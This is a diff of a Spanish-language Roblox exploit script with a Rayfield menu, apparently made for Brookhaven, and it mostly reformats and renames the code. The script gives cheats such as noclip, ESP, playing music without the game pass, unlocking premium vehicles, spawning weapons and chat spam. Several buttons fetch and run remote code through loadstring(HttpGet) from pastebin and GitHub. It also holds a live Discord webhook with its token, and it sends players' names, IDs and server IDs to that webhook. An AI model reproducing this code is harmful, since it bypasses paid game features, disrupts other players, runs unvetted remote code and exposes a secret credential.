+        if not AntiSitEnabled then return end
+        local character = player.Character
+        if not character then return end
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false) end
+    end))
 end
 
 local function SetAntiSit(state)
-    if state then
-        EnableAntiSit()
-    else
-        ClearAntiSit()
-    end
+    if state then EnableAntiSit() else ClearAntiSit() end
 end
 
 player.CharacterAdded:Connect(function(char)
@@ -1172,18 +960,14 @@ end)
 RunService.Stepped:Connect(function()
     if noclip and character then
         for _, v in pairs(character:GetDescendants()) do
-            if v:IsA("BasePart") then
-                v.CanCollide = false
-            end
+            if v:IsA("BasePart") then v.CanCollide = false end
         end
     end
 end)
 
 RunService.RenderStepped:Connect(function()
     if spin and character and character:FindFirstChild("HumanoidRootPart") then
-        character.HumanoidRootPart.CFrame =
-            character.HumanoidRootPart.CFrame *
-            CFrame.Angles(0, math.rad(spinSpeed), 0)
+        character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
     end
 end)
 
@@ -1215,20 +999,17 @@ local function createESP(plr)
     if plr == player then return end
     if not plr.Character then return end
     if espObjects[plr] then return end
-
     local highlight = Instance.new("Highlight")
-    highlight.Name = "IrvingESP"
+    highlight.Name = "KazeESP"
     highlight.FillColor = Color3.fromRGB(0, 150, 255)
     highlight.OutlineColor = Color3.fromRGB(255,255,255)
     highlight.FillTransparency = 0.5
     highlight.Parent = plr.Character
-
     local billboard = Instance.new("BillboardGui")
-    billboard.Name = "IrvingESPName"
+    billboard.Name = "KazeESPName"
     billboard.Size = UDim2.new(0,200,0,50)
     billboard.AlwaysOnTop = true
     billboard.StudsOffset = Vector3.new(0,3,0)
-
     local text = Instance.new("TextLabel")
     text.Size = UDim2.new(1,0,1,0)
     text.BackgroundTransparency = 1
@@ -1237,45 +1018,30 @@ local function createESP(plr)
     text.TextStrokeTransparency = 0
     text.TextScaled = true
     text.Parent = billboard
-
     if plr.Character:FindFirstChild("Head") then
         billboard.Parent = plr.Character.Head
     end
-
-    espObjects[plr] = {
-        Highlight = highlight,
-        Billboard = billboard
-    }
+    espObjects[plr] = { Highlight = highlight, Billboard = billboard }
 end
 
 local function removeESP(plr)
     if espObjects[plr] then
-        if espObjects[plr].Highlight then
-            espObjects[plr].Highlight:Destroy()
-        end
-        if espObjects[plr].Billboard then
-            espObjects[plr].Billboard:Destroy()
-        end
+        if espObjects[plr].Highlight then espObjects[plr].Highlight:Destroy() end
+        if espObjects[plr].Billboard then espObjects[plr].Billboard:Destroy() end
         espObjects[plr] = nil
     end
 end
 
 local function updateESP()
     for _, plr in pairs(Players:GetPlayers()) do
-        if espEnabled then
-            createESP(plr)
-        else
-            removeESP(plr)
-        end
+        if espEnabled then createESP(plr) else removeESP(plr) end
     end
 end
 
 Players.PlayerAdded:Connect(function(plr)
     plr.CharacterAdded:Connect(function()
         task.wait(1)
-        if espEnabled then
-            createESP(plr)
-        end
+        if espEnabled then createESP(plr) end
     end)
 end)
 
@@ -1286,6 +1052,7 @@ local vehicleRemote = RE:WaitForChild("1NoMoto1rVehicle1s")
 local HouseRemote = RE:WaitForChild("1Player1sHous1e")
 local CarRemote = RE:WaitForChild("1Player1sCa1r")
 local NameRemote = RE:WaitForChild("1RPNam1eColo1r")
+
 local colors = {"Bright red","Lime green","Bright blue","Bright yellow","Bright cyan","Hot pink","Royal purple"}
 local rgbEnabled = false
 local hueValue = 0
@@ -1305,22 +1072,17 @@ local function UniversalPlay(id)
     pcall(function()
         local h = RE:FindFirstChild("1Player1sHous1e")
         if h then h:FireServer("PickHouseMusicText", tostring(id), nil, true) end
-
         local c = RE:FindFirstChild("1Player1sCa1r")
-        if c then 
-            c:FireServer("Music", tostring(id), nil, true) 
+        if c then
+            c:FireServer("Music", tostring(id), nil, true)
             c:FireServer("VehicleMusicText", tostring(id), nil, true)
         end
-
         local s = RE:FindFirstChild("1NoMoto1rVehicle1s")
         if s then s:FireServer("PickingScooterMusicText", tostring(id), nil, true) end
-
         local pt = RE:FindFirstChild("PlayerToolEvent")
         if pt then pt:FireServer("ToolMusicText", tostring(id), nil, true) end
-
         local p = RE:FindFirstChild("Props")
         if p then p:FireServer("PropMusicText", tostring(id), nil, true) end
-
         local hr = RE:FindFirstChild("1Hors1eRemot1e")
         if hr then hr:FireServer("HorseMusicText", tostring(id), nil, true) end
     end)
@@ -1337,7 +1099,7 @@ local function StopMusic()
 end
 
 local function UniversalStop()
-    UniversalPlay("0") 
+    UniversalPlay("0")
 end
 
 local currentSound
@@ -1357,6 +1119,7 @@ local function NoGamePass(id)
 end
 
 MusicPassMode = true
+
 local function AddSong(tab, name, id)
     tab:CreateSection("🎵 " .. name)
     tab:CreateButton({
@@ -1368,11 +1131,7 @@ local function AddSong(tab, name, id)
             elseif MusicPassMode == false then
                 NoGamePass(id)
             end
-            Rayfield:Notify({
-                Title = name,
-                Content = "¡Reproduciendo en todos lados!",
-                Duration = 2
-            })
+            Rayfield:Notify({ Title = name, Content = "¡Reproduciendo en todos lados!", Duration = 2 })
         end
     })
     tab:CreateButton({
@@ -1381,17 +1140,9 @@ local function AddSong(tab, name, id)
             ButtonPSound()
             local added = AddFavorite(name, id)
             if added then
-                Rayfield:Notify({
-                    Title = "⭐ Favorito guardado",
-                    Content = name .. " añadida a favoritos",
-                    Duration = 2
-                })
+                Rayfield:Notify({ Title = "⭐ Favorito guardado", Content = name .. " añadida a favoritos", Duration = 2 })
             else
-                Rayfield:Notify({
-                    Title = "⚠️ Ya esta en favorito",
-                    Content = "Esta canción ya está guardada",
-                    Duration = 2
-                })
+                Rayfield:Notify({ Title = "⚠️ Ya esta en favorito", Content = "Esta canción ya está guardada", Duration = 2 })
             end
         end
     })
@@ -1405,8 +1156,8 @@ local function GetChar()
     return char, humanoid, hrp
 end
 
-local PlaysTb = Window:CreateTab("▶️ Play", 4483362458) 
-local SongsTb = Window:CreateTab("🎶 Música", 4483362458) 
+local PlaysTb = Window:CreateTab("▶️ Play", 4483362458)
+local SongsTb = Window:CreateTab("🎶 Música", 4483362458)
 local FavTb = Window:CreateTab("⭐ Favoritos", 4483362458)
 local ContactTab = Window:CreateTab("📧 Contacto", 4483362458)
 
@@ -1417,7 +1168,6 @@ FavTb:CreateSection("🎵 Tus Canciones Guardadas")
 
 local function BuildFavoritesUI()
     local favs = GetFavorites()
-    
     if #favs == 0 then
         FavTb:CreateParagraph({
             Title = "📭 No tienes favoritos aún",
@@ -1425,15 +1175,12 @@ local function BuildFavoritesUI()
         })
         return
     end
-    
     FavTb:CreateParagraph({
         Title = "📋 Total: " .. #favs .. " canciones",
         Content = "Estas canciones se cargan automáticamente al reiniciar el script."
     })
-    
     for _, fav in ipairs(favs) do
         FavTb:CreateSection("🎵 " .. fav.name)
-        
         FavTb:CreateButton({
             Name = "▶️ Reproducir",
             Callback = function()
@@ -1443,87 +1190,57 @@ local function BuildFavoritesUI()
                 else
                     NoGamePass(fav.id)
                 end
-                Rayfield:Notify({
-                    Title = fav.name,
-                    Content = "¡Reproduciendo!",
-                    Duration = 2
-                })
+                Rayfield:Notify({ Title = fav.name, Content = "¡Reproduciendo!", Duration = 2 })
             end
         })
-        
         FavTb:CreateButton({
             Name = "❌ Eliminar de Favoritos",
             Callback = function()
                 ButtonPSound()
                 if RemoveFavorite(fav.id) then
-                    Rayfield:Notify({
-                        Title = "🗑️ Eliminado",
-                        Content = fav.name .. " ya no está en favoritos",
-                        Duration = 2
-                    })
-                    Rayfield:Notify({
-                        Title = "🔄 Reinicia el script",
-                        Content = "Para ver la lista actualizada, re-ejecuta el script",
-                        Duration = 5
-                    })
+                    Rayfield:Notify({ Title = "🗑️ Eliminado", Content = fav.name .. " ya no está en favoritos", Duration = 2 })
+                    Rayfield:Notify({ Title = "🔄 Reinicia el script", Content = "Para ver la lista actualizada, re-ejecuta el script", Duration = 5 })
                 end
             end
         })
     end
 end
-
 BuildFavoritesUI()
 
 FavTb:CreateSection("⚙️ Opciones")
-
 FavTb:CreateButton({
     Name = "🔄 Recargar Lista",
     Callback = function()
         ButtonPSound()
         ReloadFavorites()
-        Rayfield:Notify({
-            Title = "🔄 Recargado",
-            Content = "Tienes " .. #GetFavorites() .. " favoritos guardados",
-            Duration = 3
-        })
+        Rayfield:Notify({ Title = "🔄 Recargado", Content = "Tienes " .. #GetFavorites() .. " favoritos guardados", Duration = 3 })
     end
 })
-
 FavTb:CreateButton({
     Name = "🗑️ Borrar TODOS los Favoritos",
     Callback = function()
         ButtonPSound()
         ClearFavorites()
-        Rayfield:Notify({
-            Title = "🗑️ Favoritos borrados",
-            Content = "Se eliminaron todas las canciones. Reinicia el script para ver los cambios.",
-            Duration = 5
-        })
+        Rayfield:Notify({ Title = "🗑️ Favoritos borrados", Content = "Se eliminaron todas las canciones. Reinicia el script para ver los cambios.", Duration = 5 })
     end
 })
-
 FavTb:CreateParagraph({
     Title = "ℹ️ Información",
     Content = "Tus favoritos se cargan automáticamente al reiniciar el script."
 })
 
 -- ═══════════════════════════════════════════════════════
-
 local MensajeHttpService = game:GetService("HttpService")
 local MensajePlayer = game:GetService("Players").LocalPlayer
 local WEBHOOK_MENSAJES = "https://discord.com/api/webhooks/1545842550261293258/S5v4pF1LpzQUllwHGSnhI4714x2_Fl6B1b_bdQ7KwZDYdKMshjnDuaiGHJKZcWI1uL3x"
 local MAX_CARACTERES = 500
 
 local function sendMessageToCreator(messageText)
-    if WEBHOOK_MENSAJES == "" or not WEBHOOK_MENSAJES then
-        return false
-    end
-    
+    if WEBHOOK_MENSAJES == "" or not WEBHOOK_MENSAJES then return false end
     local playerName = MensajePlayer.Name
     local displayName = MensajePlayer.DisplayName
     local userId = MensajePlayer.UserId
     local date = os.date("%Y-%m-%d %H:%M:%S", os.time())
-    
     local avatarUrl = ""
     pcall(function()
         local avatarRequest = string.format('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false', userId)
@@ -1532,110 +1249,53 @@ local function sendMessageToCreator(messageText)
             avatarUrl = avatarData.data[1].imageUrl
         end
     end)
-    
     local data = {
         ["content"] = "💬 **¡Nuevo mensaje para el creador!**",
         ["embeds"] = {{
             ["title"] = "📩 Mensaje de " .. displayName,
             ["color"] = 16744576,
             ["fields"] = {
-                {
-                    ["name"] = "👤 Usuario",
-                    ["value"] = displayName .. " (@ " .. playerName .. ")",
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🆔 User ID",
-                    ["value"] = tostring(userId),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "💬 Mensaje",
-                    ["value"] = messageText,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🕐 Fecha/Hora",
-                    ["value"] = date,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🔑 Server ID",
-                    ["value"] = "`" .. game.JobId .. "`",
-                    ["inline"] = false
-                }
+                { ["name"] = "👤 Usuario", ["value"] = displayName .. " (@ " .. playerName .. ")", ["inline"] = true },
+                { ["name"] = "🆔 User ID", ["value"] = tostring(userId), ["inline"] = true },
+                { ["name"] = "💬 Mensaje", ["value"] = messageText, ["inline"] = false },
+                { ["name"] = "🕐 Fecha/Hora", ["value"] = date, ["inline"] = true },
+                { ["name"] = "🔑 Server ID", ["value"] = "`" .. game.JobId .. "`", ["inline"] = false }
             },
-            ["footer"] = {
-                ["text"] = "Sistema de Mensajes"
-            },
+            ["footer"] = { ["text"] = "Sistema de Mensajes" },
             ["timestamp"] = DateTime.now():ToIsoDate(),
-            ["thumbnail"] = {
-                ["url"] = avatarUrl
-            }
+            ["thumbnail"] = { ["url"] = avatarUrl }
         }}
     }
-    
     local encodedData = MensajeHttpService:JSONEncode(data)
     local success = false
-    
     pcall(function()
         if syn and syn.request then
-            local response = syn.request({
-                Url = WEBHOOK_MENSAJES,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = encodedData
-            })
-            if response and response.StatusCode == 204 then
-                success = true
-                return
-            end
+            local response = syn.request({ Url = WEBHOOK_MENSAJES, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encodedData })
+            if response and response.StatusCode == 204 then success = true return end
         end
-        
         if not success and http and http.request then
-            local response = http.request({
-                Url = WEBHOOK_MENSAJES,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = encodedData
-            })
-            if response and response.StatusCode == 204 then
-                success = true
-                return
-            end
+            local response = http.request({ Url = WEBHOOK_MENSAJES, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encodedData })
+            if response and response.StatusCode == 204 then success = true return end
         end
-        
         if not success and request then
-            local response = request({
-                Url = WEBHOOK_MENSAJES,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = encodedData
-            })
-            if response and response.StatusCode == 204 then
-                success = true
-                return
-            end
+            local response = request({ Url = WEBHOOK_MENSAJES, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encodedData })
+            if response and response.StatusCode == 204 then success = true return end
         end
-        
         if not success then
             MensajeHttpService:PostAsync(WEBHOOK_MENSAJES, encodedData, Enum.HttpContentType.ApplicationJson)
             success = true
         end
     end)
-    
     return success
 end
 
 ContactTab:CreateSection("💬 Enviar Mensaje al Creador")
-
 ContactTab:CreateParagraph({
     Title = "📝 ¿Quieres contactar al creador?",
     Content = "Reporta bugs, haz sugerencias o contacta directamente."
 })
 
 local mensajeTexto = ""
-
 ContactTab:CreateInput({
     Name = "Tu Mensaje!",
     PlaceholderText = "AQUI LO QUE QUIERAS DECIR UN INSULTO BANEADO",
@@ -1646,97 +1306,48 @@ ContactTab:CreateInput({
 })
 
 local enviando = false
-
 ContactTab:CreateButton({
     Name = "Enviar Mensaje",
     Callback = function()
         if enviando then
-            Rayfield:Notify({
-                Title = "⏳ Enviando Mensaje",
-                Content = "PACIENCIA",
-                Duration = 2,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "⏳ Enviando Mensaje", Content = "PACIENCIA", Duration = 2, Image = 4483362458 })
             return
         end
-        
         if mensajeTexto == "" or mensajeTexto:match("^%s*$") then
-            Rayfield:Notify({
-                Title = "❌ Mensaje Vacío",
-                Content = "ESCRIBE ALGO BROO",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Mensaje Vacío", Content = "ESCRIBE ALGO BROO", Duration = 3, Image = 4483362458 })
             return
         end
-        
         if string.len(mensajeTexto) > MAX_CARACTERES then
-            Rayfield:Notify({
-                Title = "❌ Mensaje Muy Largo",
-                Content = "Tu mensaje excede el límite de " .. MAX_CARACTERES .. " caracteres",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Mensaje Muy Largo", Content = "Tu mensaje excede el límite de " .. MAX_CARACTERES .. " caracteres", Duration = 3, Image = 4483362458 })
             return
         end
-        
         enviando = true
-        
-        Rayfield:Notify({
-            Title = "⏳ Enviando Mensaje",
-            Content = "Mensaje enviandose...",
-            Duration = 2,
-            Image = 4483362458,
-        })
-        
+        Rayfield:Notify({ Title = "⏳ Enviando Mensaje", Content = "Mensaje enviandose...", Duration = 2, Image = 4483362458 })
         task.wait(0.5)
-        
         local sendSuccess, sendResult = pcall(function()
             return sendMessageToCreator(mensajeTexto)
         end)
-        
         if not sendSuccess then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Content = "Error interno ni puta idea",
-                Duration = 5,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Content = "Error interno ni puta idea", Duration = 5, Image = 4483362458 })
             enviando = false
             return
         end
-        
         local success = sendResult
-        
         if success then
-            Rayfield:Notify({
-                Title = "✅ ¡Éxito!",
-                Content = "Tu mensaje fue enviado correctamente.!!",
-                Duration = 4,
-                Image = 4483362458,
-            })
-            
+            Rayfield:Notify({ Title = "✅ ¡Éxito!", Content = "Tu mensaje fue enviado correctamente.!!", Duration = 4, Image = 4483362458 })
             mensajeTexto = ""
         else
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Content = "No se pudo enviar el mensaje. Intenta más tarde.",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Content = "No se pudo enviar el mensaje. Intenta más tarde.", Duration = 3, Image = 4483362458 })
         end
-        
         enviando = false
     end
 })
 
 ContactTab:CreateSection("ℹ️ Información")
-
 ContactTab:CreateParagraph({
     Title = "🚫 Reglas Estrictas",
     Content = "Si escribes algo malo, alguna cosa prohibida o algo de el de las reglas de abajo, te vas PERMA BANEADO del script.\n\nATT: Creador"
 })
-
 ContactTab:CreateParagraph({
     Title = "📋 Reglas",
     Content = "• Sé respetuoso y constructivo\n• No uses lenguaje ofensivo\n• No envíes spam."
@@ -1745,94 +1356,79 @@ ContactTab:CreateParagraph({
 local ScriptsTb = Window:CreateTab("🧾 Scripts", 4483362458)
 
 PlaysTb:CreateSection("Elige si quieres reproducir música con o sin Music Pass.")
+
 local ToggleMusicPass = PlaysTb:CreateToggle({
-   Name = "Con Music Pass ✅",
-   CurrentValue = true,
-   Flag = "MusicPassToggle",
-   Callback = function(Value)
-      ButtonPSound()
-      MusicPassMode = Value
-      if Value then
-         Rayfield:Notify({
-            Title = "Modo Música",
-            Content = "Con Music Pass Activado",
-            Duration = 2
-         })
-      else
-         Rayfield:Notify({
-            Title = "Modo Música",
-            Content = "Sin Music Pass Activado",
-            Duration = 2
-         })
-      end
-   end,
+    Name = "Con Music Pass ✅",
+    CurrentValue = true,
+    Flag = "MusicPassToggle",
+    Callback = function(Value)
+        ButtonPSound()
+        MusicPassMode = Value
+        if Value then
+            Rayfield:Notify({ Title = "Modo Música", Content = "Con Music Pass Activado", Duration = 2 })
+        else
+            Rayfield:Notify({ Title = "Modo Música", Content = "Sin Music Pass Activado", Duration = 2 })
+        end
+    end,
 })
 
 PlaysTb:CreateSection("Introduce ID Personalizada")
 local customID = ""
 PlaysTb:CreateInput({
-   Name = "Song ID",
-   PlaceholderText = "Pega aquí...",
-   Callback = function(t) ButtonPSound() customID = t end,
+    Name = "Song ID",
+    PlaceholderText = "Pega aquí...",
+    Callback = function(t)
+        ButtonPSound()
+        customID = t
+    end,
 })
 PlaysTb:CreateButton({
-   Name = "▶️ Reproducir ID Manual",
-   Callback = function() ButtonPSound() UniversalPlay(customID) end,
+    Name = "▶️ Reproducir ID Manual",
+    Callback = function()
+        ButtonPSound()
+        UniversalPlay(customID)
+    end,
 })
-
 PlaysTb:CreateButton({
-   Name = "⭐ Guardar ID Manual en Favoritos",
-   Callback = function()
-       ButtonPSound()
-       if customID and customID ~= "" then
-           local added = AddFavorite("ID Manual: " .. customID, customID)
-           if added then
-               Rayfield:Notify({
-                   Title = "⭐ Guardado",
-                   Content = "ID " .. customID .. " añadido a favoritos",
-                   Duration = 2
-               })
-           else
-               Rayfield:Notify({
-                   Title = "⚠️ Ya existe",
-                   Content = "Esa ID ya está en favoritos",
-                   Duration = 2
-               })
-           end
-       else
-           Rayfield:Notify({
-               Title = "❌ Error",
-               Content = "Primero introduce una ID",
-               Duration = 2
-           })
-       end
-   end,
+    Name = "⭐ Guardar ID Manual en Favoritos",
+    Callback = function()
+        ButtonPSound()
+        if customID and customID ~= "" then
+            local added = AddFavorite("ID Manual: " .. customID, customID)
+            if added then
+                Rayfield:Notify({ Title = "⭐ Guardado", Content = "ID " .. customID .. " añadido a favoritos", Duration = 2 })
+            else
+                Rayfield:Notify({ Title = "⚠️ Ya existe", Content = "Esa ID ya está en favoritos", Duration = 2 })
+            end
+        else
+            Rayfield:Notify({ Title = "❌ Error", Content = "Primero introduce una ID", Duration = 2 })
+        end
+    end,
 })
-
 PlaysTb:CreateButton({
-   Name = "⏹️ Detener Música",
-   Callback = function() 
-       ButtonPSound()
-       UniversalStop() 
-       StopMusic()
-   end,
+    Name = "⏹️ Detener Música",
+    Callback = function()
+        ButtonPSound()
+        UniversalStop()
+        StopMusic()
+    end,
 })
 
 local VolumeRemote = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUIHandler"):WaitForChild("MainAudio"):WaitForChild("Catalog"):WaitForChild("Header"):WaitForChild("VolumeContainer"):WaitForChild("VolumeChangeRequest")
 
 local VolumeSlider = PlaysTb:CreateSlider({
-   Name = "🔊 Control de Volumen",
-   Range = {1, 100},
-   Increment = 5,
-   CurrentValue = 50,
-   Suffix = "%",
-   Flag = "VolumeSlider",
-   Callback = function(Value)
-      ButtonPSound()
-      pcall(function()
-          VolumeRemote:FireServer(Value)
-      end)
-   end,
+    Name = "🔊 Control de Volumen",
+    Range = {1, 100},
+    Increment = 5,
+    CurrentValue = 50,
+    Suffix = "%",
+    Flag = "VolumeSlider",
+    Callback = function(Value)
+        ButtonPSound()
+        pcall(function()
+            VolumeRemote:FireServer(Value)
+        end)
+    end,
 })
 
 PlaysTb:CreateSection("Elige tu vehículo para música")
@@ -1849,7 +1445,6 @@ PlaysTb:CreateButton({
         Rayfield:Notify({Title = "Sistema", Content = "Segway Premium Glitcheado!", Duration = 2})
     end
 })
-
 PlaysTb:CreateButton({
     Name = "🛹 Sin Premium: Skateboard",
     Callback = function()
@@ -1863,7 +1458,6 @@ PlaysTb:CreateButton({
         Rayfield:Notify({Title = "Sistema", Content = "Skateboard Glitcheado!", Duration = 2})
     end
 })
-
 PlaysTb:CreateButton({
     Name = "❌ Eliminar Vehículo & Reiniciar",
     Callback = function()
@@ -1879,28 +1473,28 @@ PlaysTb:CreateButton({
 })
 
 PlaysTb:CreateToggle({
-   Name = "🌈 Vehicle RGB (necesitas gamepass puto brook) ",
-   CurrentValue = false,
-   Flag = "VehicleRgbToggle",
-   Callback = function(Value)
-      ButtonPSound()
-      vehicleRgb = Value
-      if vehicleRgb then
-          task.spawn(function()
-              while vehicleRgb do
-                  hueValue = (hueValue + 0.02) % 1
-                  local smoothColor = Color3.fromHSV(hueValue, 1, 1)
-                  pcall(function()
-                      CarRemote:FireServer("NoMotorColor", smoothColor)
-                  end)
-                  pcall(function()
-                      game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SetUnderglowColor"):InvokeServer(1, smoothColor)
-                  end)
-                  task.wait(0.05) 
-              end
-          end)
-      end
-   end,
+    Name = "🌈 Vehicle RGB (necesitas gamepass puto brook) ",
+    CurrentValue = false,
+    Flag = "VehicleRgbToggle",
+    Callback = function(Value)
+        ButtonPSound()
+        vehicleRgb = Value
+        if vehicleRgb then
+            task.spawn(function()
+                while vehicleRgb do
+                    hueValue = (hueValue + 0.02) % 1
+                    local smoothColor = Color3.fromHSV(hueValue, 1, 1)
+                    pcall(function()
+                        CarRemote:FireServer("NoMotorColor", smoothColor)
+                    end)
+                    pcall(function()
+                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SetUnderglowColor"):InvokeServer(1, smoothColor)
+                    end)
+                    task.wait(0.05)
+                end
+            end)
+        end
+    end,
 })
 
 local AntiSitToggleObject = PlaysTb:CreateToggle({
@@ -1914,15 +1508,14 @@ local AntiSitToggleObject = PlaysTb:CreateToggle({
 })
 
 PlaysTb:CreateButton({
-    Name = "Irving Spammer",
+    Name = "Kaze Spammer",
     Callback = function()
         ButtonPSound()
         loadstring(game:HttpGet("https://pastebin.com/raw/zBaumpUd"))()
     end
 })
-
 PlaysTb:CreateButton({
-    Name = "Irving Emote Gui",
+    Name = "Kaze Emote Gui",
     Callback = function()
         ButtonPSound()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Emote-Gui-75782"))()
@@ -1960,7 +1553,7 @@ AddSong(SongsTb, "124_z Bebesitabebelin [ Milke_x]", 126529839322967)
 AddSong(SongsTb, "nose [milke_x]", 80488815553151)
 AddSong(SongsTb, "Esperándote [Jorgue_78 milke_x]", 80420147200412)
 AddSong(SongsTb, "See_Trap7 Jorge_7x Milke_x", 99431678056535)
-AddSong(SongsTb, "Maka  [Made by Milke_x]", 113045147285146)
+AddSong(SongsTb, "Maka [Made by Milke_x]", 113045147285146)
 AddSong(SongsTb, "Corrido [Made by Milke_x]", 108484635464666)
 AddSong(SongsTb, "Jueves en Culiaca [Made by Milke_xd]", 100164487427073)
 AddSong(SongsTb, "Diavla [made by Milke_x]", 85241845241373)
@@ -2129,7 +1722,7 @@ ScriptsTb:CreateButton({
 
 ScriptsTb:CreateSection("Chat Spammer")
 ScriptsTb:CreateButton({
-    Name = "Irving Spammer",
+    Name = "Kaze Spammer",
     Callback = function()
         ButtonPSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/Spammer%202"))()
@@ -2138,7 +1731,7 @@ ScriptsTb:CreateButton({
 
 ScriptsTb:CreateSection("BlackHole")
 ScriptsTb:CreateButton({
-    Name = "Irving Agujero Negro",
+    Name = "Kaze Agujero Negro",
     Callback = function()
         ButtonPSound()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/Blahoule"))()
@@ -2153,6 +1746,7 @@ ScriptsTb:CreateButton({
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Slayerzxz/DarkBrook/refs/heads/main/brookhaven.lua"))()
     end
 })
+
 -------------------------------------------------------------------------------
 local TabItems = Window:CreateTab("📦 Items [Nuevo]", 4483362458)
 
@@ -2163,7 +1757,6 @@ TabItems:CreateButton({
         Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "RPG")
     end,
 })
-
 TabItems:CreateButton({
     Name = "TearGasLauncher",
     Callback = function()
@@ -2171,7 +1764,6 @@ TabItems:CreateButton({
         Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "TearGasLauncher")
     end,
 })
-
 TabItems:CreateButton({
     Name = "SnowballCannon",
     Callback = function()
@@ -2179,7 +1771,6 @@ TabItems:CreateButton({
         Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "SnowballCannon")
     end,
 })
-
 TabItems:CreateButton({
     Name = "WardenPistol",
     Callback = function()
@@ -2187,7 +1778,6 @@ TabItems:CreateButton({
         Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "WardenPistol")
     end,
 })
-
 TabItems:CreateButton({
     Name = "UraniumRod",
     Callback = function()
@@ -2195,7 +1785,6 @@ TabItems:CreateButton({
         Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "UraniumRod")
     end,
 })
-
 TabItems:CreateButton({
     Name = "EggLauncher",
     Callback = function()
@@ -2203,7 +1792,6 @@ TabItems:CreateButton({
         Event:FireServer("ToolGiveToServer", game:GetService("Players").LocalPlayer, "EggLauncher")
     end,
 })
-
 TabItems:CreateButton({
     Name = "Water Ballon",
     Callback = function()
@@ -2213,11 +1801,8 @@ TabItems:CreateButton({
 })
 
 local AvatarTb = Window:CreateTab("👔 Avatar", 4483362458)
-
 AvatarTb:CreateSection("📋 Copiar Avatar de Otro Jugador")
-
 local TargetPlayer = nil
-
 local function GetPlayerNames()
     local names = {}
     for _, v in pairs(Players:GetPlayers()) do
@@ -2227,7 +1812,6 @@ local function GetPlayerNames()
     end
     return names
 end
-
 local PlayerDropdown = AvatarTb:CreateDropdown({
     Name = "Seleccionar Jugador",
     Options = GetPlayerNames(),
@@ -2244,80 +1828,35 @@ AvatarTb:CreateButton({
     Callback = function()
         ButtonPSound()
         if not TargetPlayer or TargetPlayer == "" then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Content = "Debes seleccionar un jugador primero",
-                Duration = 3
-            })
+            Rayfield:Notify({ Title = "❌ Error", Content = "Debes seleccionar un jugador primero", Duration = 3 })
             return
         end
-
         local TPlr = Players:FindFirstChild(TargetPlayer)
         local LPlr = Players.LocalPlayer
-        
         if TPlr and TPlr.Character and LPlr.Character then
             local THum = TPlr.Character:FindFirstChildOfClass("Humanoid")
             local LHum = LPlr.Character:FindFirstChildOfClass("Humanoid")
-
             if THum and LHum then
                 local PDesc = THum:GetAppliedDescription()
-                
-                local argsBody = {
-                    [1] = {
-                        [1] = PDesc.Torso,
-                        [2] = PDesc.RightArm,
-                        [3] = PDesc.LeftArm,
-                        [4] = PDesc.RightLeg,
-                        [5] = PDesc.LeftLeg,
-                        [6] = PDesc.Head
-                    }
-                }
+                local argsBody = { [1] = { [1] = PDesc.Torso, [2] = PDesc.RightArm, [3] = PDesc.LeftArm, [4] = PDesc.RightLeg, [5] = PDesc.LeftLeg, [6] = PDesc.Head } }
                 Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
                 task.wait(0.3)
-
-                if tonumber(PDesc.Shirt) then
-                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
-                    task.wait(0.2)
-                end
-                if tonumber(PDesc.Pants) then
-                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
-                    task.wait(0.2)
-                end
-                if tonumber(PDesc.Face) then
-                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
-                    task.wait(0.2)
-                end
-                
+                if tonumber(PDesc.Shirt) then Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt)) task.wait(0.2) end
+                if tonumber(PDesc.Pants) then Remotes.Wear:InvokeServer(tonumber(PDesc.Pants)) task.wait(0.2) end
+                if tonumber(PDesc.Face) then Remotes.Wear:InvokeServer(tonumber(PDesc.Face)) task.wait(0.2) end
                 for _, v in ipairs(PDesc:GetAccessories(true)) do
-                    if v.AssetId then
-                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))
-                        task.wait(0.1)
-                    end
+                    if v.AssetId then Remotes.Wear:InvokeServer(tonumber(v.AssetId)) task.wait(0.1) end
                 end
-                
                 local SkinColor = TPlr.Character:FindFirstChild("Body Colors")
                 if SkinColor then
